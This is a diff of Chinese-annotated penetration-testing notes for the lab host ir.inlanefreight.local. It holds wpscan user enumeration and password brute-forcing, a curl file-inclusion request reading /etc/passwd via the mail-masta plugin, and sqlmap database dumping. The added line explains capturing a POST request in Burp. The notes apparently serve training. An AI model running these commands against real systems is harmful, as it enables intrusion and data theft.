@@ -104,6 +104,7 @@ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local      枚举 WordPre
 curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd      mail-masta 插件的漏洞
 wpscan -e u -t 500 --url http://ir.inlanefreight.local      枚举用户
 wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp      爆破 ilfreightwp
+用 Burp 捕获 POST 请求，将其保存到文件 sqli.txt ，并用 * 标记 searchitem 参数
 sqlmap -r sqli.txt --dbms=mysql      自动 SQL 攻击工具，sqli.txt 是一个 POST 完整请求
 sqlmap -r sqli.txt --dbms=mysql --dbs                    枚举数据库
 sqlmap -r sqli.txt --dbms=mysql -D status --tables      枚举 status 库里的表格
